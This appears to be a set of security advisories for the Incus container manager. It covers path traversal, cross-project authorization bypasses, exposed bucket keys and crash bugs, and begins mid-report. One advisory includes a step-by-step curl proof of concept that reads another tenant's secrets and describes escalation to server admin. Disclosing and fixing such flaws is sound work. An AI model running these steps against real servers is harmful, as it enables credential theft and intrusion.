Evidence - `resp.MetaName = filename` at `client/incus_images.go:356` with no sanitization; `os.Rename(...filepath.Join(target, resp.MetaName))` at `cmd/incus/image.go:641`. `grep filepath.Base` → only in the upload/import path (`image.go:834/836`), never between `:356` and `:641`. - `go run` proofs: `mime.ParseMediaType` returns `../` verbatim; `part.FileName()` basenames (safe branch asymmetry); `os.Rename` across `../` overwrites the escaped target. - DISTINCT from GHSA-f6m5-xw2g-xc4x / CVE-2026-48769: that advisory's DETAILS are the DAEMON (`cmd/incusd/daemon_images.go`, `os.Create`, trusting `Incus-Image-Hash` for `source.type=url`, writing under `/var/lib/incus/images/`). This report covers the CLI CLIENT (`client/incus_images.go` + `cmd/incus/image.go`, `os.Rename`, trusting `Content-Disposition`, writing on the user's local filesystem). Different component, tainted header, sink, and fix. ## Affected Versions `<= 7.3.0` (Go module `github.com/lxc/incus/v7`). Sinks verified present on the v7.3.0 release tag (`90429bf`): `resp.MetaName = filename` at `client/incus_images.go:356` with no sanitization, the hash gate still keyed on the server-supplied `X-Incus-Type` header at `:254`/`:360`, and the `os.Rename` sink at `cmd/incus/image.go:641`. Confirmed still present on `main`. ## Suggested Fix Apply `filepath.Base` to `resp.MetaName` (and `resp.RootfsName`) on the unified-image branch before `os.Rename`, mirroring the multipart branch's use of `part.FileName()`; reject any name containing path separators or `..`. --- Reported by zx (Jace) — GitHub: @manus-use

GHSA-hpjh-q53p-f27r.title: Arbitrary file write on host via path traversal in instance backup dependent volumes
GHSA-hpjh-q53p-f27r.description: ### Summary Importing an instance backup validates the instance name and snapshot names, but not the names of the dependent custom volumes listed in the backup's `index.yaml`. Those names are used verbatim as path segments when creating the volume on the target storage pool, so a `../` chain escapes the storage pool directory. ### Impact Any client allowed to create instances in a project can have the Incus daemon create root-owned directories, populated with attacker-controlled content, at arbitrary paths on the host, leading to full host compromise. The backup also names the project each dependent volume is created in, so the same request could create custom volumes in projects the caller has no access to. ### Details The fixes for CVE-2026-81495 and CVE-2026-81496 added name validation to the direct custom volume and instance backup import handlers. The dependent volume path nested inside an instance backup reaches the same volume creation code without going through either check. The name flows through `filepath.Join`, which collapses `../`, into `os.Mkdir` and the subsequent unpacking of the volume data. The attached-device gate can be satisfied by splitting the traversal string across the device's `pool` and `source` fields, as only the pool of the volume entry is resolved against a real storage pool. ### Workarounds Only allow trusted clients to create instances.

GHSA-mfwv-x733-9446.title: Authorization bypass lets a restricted client read any operation in another project
GHSA-mfwv-x733-9446.description: ### Summary **Broken Authorization (CWE-862, Missing Authorization) on `GET /1.0/operations/{uuid}`.** The handler performs no authorization of any kind. Any authenticated client — including a TLS client certificate restricted to a single project — can read the full contents of any in-flight operation in any other project, including the command line, the environment variables and the websocket secrets the operation carries. `operationGet` is registered under `allowAuthenticated`, which your own code documents as deferring the real decision to the handler. The handler never makes one. ### Affected | Line | Range | Verified | |---|---|---| | Feature | `>= v0.2.0`, through `v7.4.0` | runtime, 7.4.0 from your apt repository | | LTS 6.0 | `v6.0.0` – `v6.0.6`, `stable-6.0` HEAD | runtime, 6.0.6 from your apt repository | | 7.0 | `v7.0.0`, `v7.0.1`, `stable-7.0` HEAD | source | | main | `dd19d9938` | source | The check has never existed. `operationGet` is 53 lines with zero authorizer calls at every tag from `v6.0.0` to `v7.4.0` and on all three branch heads. `v0.2.0` is the first release containing `613f937dc`, which is where operations authorization was introduced — so it is the first release in which Incus claims to authorize operations and does not authorize this one. One question on the range rather than an assertion: `doc/support.md` still describes 6.x as the feature line and refers to a future 7.0 LTS, while `stable-7.0` already carries point releases. Please confirm whether 7.0 is a supported line before the advisory range is published. ### Contrast, on one URL, one certificate, one instant A client certificate restricted to project `attacker`. A container `victim-box` in project `victim`. An admin starts an `exec` in `victim` carrying a marker in its environment. Then, as the restricted certificate: ``` --- attacker GET /1.0/operations/7a8fca8a-ff78-49a1-af51-fd73cf56aee1 -> 200 --- attacker GET .../wait?timeout=1 -> 200 --- attacker DELETE /1.0/operations/7a8fca8a-ff78-49a1-af51-fd73cf56aee1 -> 403 --- DELETE error body: {'error_code':403,'error':'User does not have permission for project \'victim\''} --- contents returned by the GET that was allowed, after the DELETE was denied: {'instances':['/1.0/instances/victim-box?project=victim']} {'DB_PASSWORD':'s3cr3t-victim-value','HOME':'/root','LANG':'C.UTF-8','USER':'root','PATH':'...'} {'0':'c5c793028efb9e0691423dfcd2a36e6dc18031b1408211ed8aa80308a7aef2a1', '1':'e557d78cd9a22790759e6997f1fdcdb9a5f22c41d811e588a3d96ea9021fffd7', '2':'edf04a0ae7d90ed45e31b322d9be311dfaef2683e5be6676bc07bab34c0caf34', 'control':'afa5bb2ed82f416c563d6f8881a4f5a01c3d66ad14ca3b5ce3f7c90e50c4d85b'} ``` `DELETE` refuses by project. `GET` on the same URL, from the same certificate, in the same second, hands over the victim's command line, environment and websocket secrets. ### Root cause `cmd/incusd/operations.go` registers three actions under `allowAuthenticated`: ```go 33: Delete: APIEndpointAction{Handler: operationDelete, AccessHandler: allowAuthenticated}, 34: Get: APIEndpointAction{Handler: operationGet, AccessHandler: allowAuthenticated}, 40: Get: APIEndpointAction{Handler: operationsGet, AccessHandler: allowAuthenticated}, ``` `cmd/incusd/daemon.go:275` states the contract: > `allowAuthenticated` is an AccessHandler which allows only authenticated requests. This should be used in conjunction with **further access control within the handler** (e.g. to filter resources the user is able to view/edit). Two of the three do that. `operationDelete` resolves the project from `op.Project()`, reads `op.Permission()`, builds an `auth.NewObject` per resource and calls `s.Authorizer.CheckPermission` (`operations.go:280-306`). `operationsGet` takes a `GetPermissionChecker` for `auth.EntitlementCanViewOperations` and filters every local and remote operation through it (`operations.go:538`, `:556`, `:584`). `operationGet` (`operations.go:181`) resolves the operation out of the global UUID-keyed map and renders it: ```go op, err := operations.OperationGetInternal(id) if err == nil { _, body, err = op.Render() if err != nil { return response.SmartError(err) } return response.SyncResponse(true, body) } ``` No `op.Project()`, no `op.Permission()`, no authorizer call, no read of `?project=`. The map is global, so the UUID alone selects the object. This is not a regression. `git log -S` puts it at the commit that introduced operations authorization: `613f937dc`, 2023-10-25, *'lxd: Update authorization for operations'* — a single-file, 34-line diff with four hunks. One hunk adds the check to `operationDelete`; three add the checker and its two filter sites to `operationsGet`. `operationGet` sits 77 lines above the `operationDelete` hunk **in that same diff** and is not touched. The list and the destructive verb were authorized; the read was walked past. ### Impact A tenant holding a restricted certificate — the mechanism Incus ships specifically to confine a client to its own projects — reads, from any other project on the server: - the full command line of any running `exec`, including anything passed as an argument; - the complete environment of that command, which is where deployment tooling puts database passwords, API tokens and cloud credentials; - the `fds` secrets for the operation's websockets, and the operation's resource URLs, which name instances and volumes in the other project. **Escalation to full server admin, demonstrated.** `incus config trust add` creates a `Running` operation whose metadata *is* the enrolment token. Reading that operation yields the token; the token enrols a fresh, unrestricted client certificate. From the restricted certificate we read such an operation, reassembled the token, enrolled a new certificate, and then read the victim's instance (HTTP 200) and listed every project on the server. We are **not** pricing that chain into the score below, because it needs a trust-token operation to be pending at the moment of the read, and that is operator timing rather than code. It is reported because it bounds what the primitive is worth, not because we are claiming it. **Limitation, stated plainly.** The attacker must know the operation's UUID and cannot get it from Incus. `uuid.New()` (`internal/server/operations/operations.go:138`) is `crypto/rand`-backed UUIDv4, 122 bits. We verified that a restricted certificate sees nothing through any enumeration path: `/1.0/operations?project=attacker`, `?all-projects=true` and `?project=victim` all return empty, and the victim's instance is correctly refused with 403. The UUID must come from outside — an operator's shell history or CI log, the `Location` header of an async response passing through a proxy or APM trace, `incus monitor` output pasted into a ticket, a former project membership, or a co-tenant on a shared automation account. No victim interaction is required after that. This is the same gating you accepted in CVE-2026-81501, whose text reads: *'the 64-hex fingerprint is not returned by GET / list to a caller without CanView. The attacker must obtain it out of band (logs, backups, a former project membership, a predictable custom image, etc.). No victim interaction is required after that.'* ### Suggested fix Give `operationGet` the check `operationDelete` already performs. The finished handler, with the existing body unchanged below it: ```go func operationGet(d *Daemon, r *http.Request) response.Response { s := d.State() id, err := pathVar(r, 'id') if err != nil { return response.SmartError(err) } var body *api.Operation // First check if the query is for a local operation from this node op, err := operations.OperationGetInternal(id) if err == nil { projectName := op.Project() if projectName == '' { projectName = api.ProjectDefaultName } err = s.Authorizer.CheckPermission(r.Context(), r, auth.ObjectProject(projectName), auth.EntitlementCanViewOperations) if err != nil { return response.SmartError(err) } _, body, err = op.Render() if err != nil { return response.SmartError(err) } return response.SyncResponse(true, body) } ``` `CanViewOperations` is the entitlement `operationsGet` already uses for exactly this question, so the read path and the list path end up answering it the same way. Using `op.Permission()` as `operationDelete` does would also work and would be stricter; `CanViewOperations` is suggested because it matches the verb. The cluster-forwarding branch below it inherits the fix for free: the remote member runs `operationGet` too and will apply the same check to the forwarded identity. `operationWaitGet` (`operations.go:46`) is registered `AllowUntrusted: true` and returns the same rendered object on completion. It needs the same treatment or the fix is bypassable by waiting instead of getting. We have not tested that path against a fix and are flagging it rather than asserting it. ### Dedup We could find no published advisory of yours covering operations. The fourteen published between 2026-07-30 and 2026-08-27 are image import, backup import, volume import, cross-project instance copy, migration config override, network address sets, idmap isolation, nvidia capabilities, VM template paths, image symlinks and fingerprints, and a CLI traversal. If this duplicates something already in your queue, please say so and close it — we would rather know than have you carry two. ### PoC Full sequence, reproducible on a clean install. Run as the server admin except where marked. ```sh # --- setup, as admin ------------------------------------------------------- incus project create victim incus project create attacker incus launch images:debian/12 victim-box --project victim # a client certificate restricted to project 'attacker' incus config trust add --name attacker --restricted --projects attacker # enrol that token from the client, then confirm the restriction: incus query /1.0/certificates/<fingerprint> # { 'name': 'attacker', 'restricted': true, 'projects': [ 'attacker' ] } # --- controls: the restriction works --------------------------------------- # as the attacker certificate curl --cert attacker.crt --key attacker.key -k \ 'https://SERVER:8443/1.0/instances/victim-box?project=victim' # 403 User does not have permission for project 'victim' for q in 'project=attacker' 'all-projects=true' 'project=victim'; do curl --cert attacker.crt --key attacker.key -k \ 'https://SERVER:8443/1.0/operations?$q' done # {} {} {} the operation is invisible through every listing curl -k 'https://SERVER:8443/1.0/operations/$OPID' # no client cert # 403 # --- the finding ----------------------------------------------------------- # as admin, start a command in the victim project carrying a marker incus exec victim-box --project victim --env DB_PASSWORD=s3cr3t-victim-value -- sleep 600 & OPID=$(incus operation list --project victim --format csv | head -1 | cut -d, -f1) # as the attacker certificate, same URL, two verbs curl --cert attacker.crt --key attacker.key -k \ -X DELETE 'https://SERVER:8443/1.0/operations/$OPID' # 403 User does not have permission for project 'victim' curl --cert attacker.crt --key attacker.key -k \ 'https://SERVER:8443/1.0/operations/$OPID' # 200, and the body contains: # resources.instances -> /1.0/instances/victim-box?project=victim # metadata.environment.DB_PASSWORD -> s3cr3t-victim-value # metadata.fds -> 0, 1, 2, control ``` Verified identically on `7.4.0` and on `6.0.6`, both installed from your apt repository. Both lab containers were destroyed after the run. ### Severity `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N` — **6.3 Medium**. This is set to **parity with your own scoring of CVE-2026-81501**, which carries the identical vector, rather than argued upward. Metric by metric: - **AV:N** — the HTTPS API, reachable from wherever the client is. - **AC:H** — the 122-bit UUID must be obtained out of band. This is the metric doing the work, and it is the same one you applied to the out-of-band fingerprint in CVE-2026-81501. - **PR:L** — a valid, enrolled client certificate. Not unauthenticated: `allowAuthenticated` refuses an untrusted client on this URL, and we checked. - **UI:N** — no victim interaction once the UUID is held. - **S:C** — the vulnerable component is the API's authorization layer; the impacted component is another project, which is the isolation boundary Incus sells. - **C:H / I:N / A:N** — the endpoint is read-only. Secrets of arbitrary value are returned. If you prefer to price the demonstrated trust-token chain, the vector becomes `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H` = **8.5 High**. We are not proposing it, for the reason given under Impact, but it is the honest ceiling and the decision is yours.

GHSA-x8gj-2q73-qr6j.title: Restricted client can read storage bucket keys in the default project
GHSA-x8gj-2q73-qr6j.description: ### Summary The storage bucket key endpoints, `GET /1.0/storage-pools/{pool}/buckets/{bucket}/keys` and `GET .../keys/{key}`, only require `can_view` on the bucket and return the S3 access key and secret key. When using the TLS authorizer, a restricted client certificate is granted read-only access to buckets in the `default` project, so that projects without `features.storage.buckets` can use them. That read-only exception therefore also hands out the bucket credentials. ### Impact A client with a restricted TLS certificate scoped to any project can read the access key and secret key of every bucket in the `default` project, then use them directly against the S3 endpoint to read, modify or delete the objects in those buckets. Only the TLS authorizer is affected. OpenFGA deployments are not. ### Details Bucket keys are credentials rather than metadata, so both key retrieval endpoints now require `can_edit` on the bucket. Listing buckets and reading bucket details remain available under `can_view`. ### Workarounds Don't keep buckets in the `default` project on servers that issue restricted client certificates, or rotate the keys of any bucket a restricted client may have read.

CVE-2026-35527.title: Incus is an open source container and virtual machine manager. In ...
CVE-2026-35527.description:
Incus is an open source container and virtual machine manager. In versions prior to 7.0.0, the image import flow issues an outbound HEAD request to a user-supplied URL before validating the request against project restrictions such as restricted.images.servers. The custom volume backup import subsystem contains a nil-pointer dereference vulnerability during import operations. In the snapshot import loop, the daemon iterates over entries from `srcBackup.Config.VolumeSnapshots` and assumes that each slice element is initialized, then dereferences fields such as `Name`, `Config`, `Description`, `CreatedAt`, and `ExpiresAt` without first validating the element itself. CVE-2026-40243.description:
Incus is a system container and virtual machine manager. In versions before 7.0.0, broken TLS validation logic in the OVN database connection logic can allow connections to an attacker's OVN database. The OVN client implementations disable Go standard TLS server verification and replace it with custom peer-certificate verification logic. That replacement verifier does not anchor trust in the configured CA certificate. Instead, it constructs the verification root set from certificates supplied by the peer during the handshake, so the configured CA is parsed but not used as the trust anchor for the final verification decision.

In OVN-enabled deployments that use these SSL database connection paths, an attacker able to impersonate or intercept the OVN endpoint on the management network can present a rogue self-signed certificate chain, and Incus will accept this certificate as valid. This issue defeats the intended CA-based trust model for OVN database connections and permits endpoint impersonation by an active attacker in a suitable network position. This issue is fixed in version 7.0.0.

CVE-2026-40251.description:

The backup restore subsystem contains an out-of-bounds panic vulnerability caused by an invalid bounds check when indexing snapshot metadata arrays, and the same flawed pattern also appears in the migration path. When iterating through physical snapshots provided in a backup archive, the loop uses the index to look up corresponding metadata in the parsed `Config.Snapshots` and `Config.VolumeSnapshots` slices. The guard condition `len(slice) >= i-1` is incorrect because it can still evaluate to true when the subsequent slice[i] access is out of bounds.

An attacker can submit a backup archive that contains physical snapshot directories while supplying a tampered `index.yaml` with an empty or truncated snapshot metadata array, causing the daemon to index beyond the end of the metadata slice and crash. Repeated use of this issue can be used to keep Incus offline, causing a denial of service. This issue is fixed in version 7.0.0.
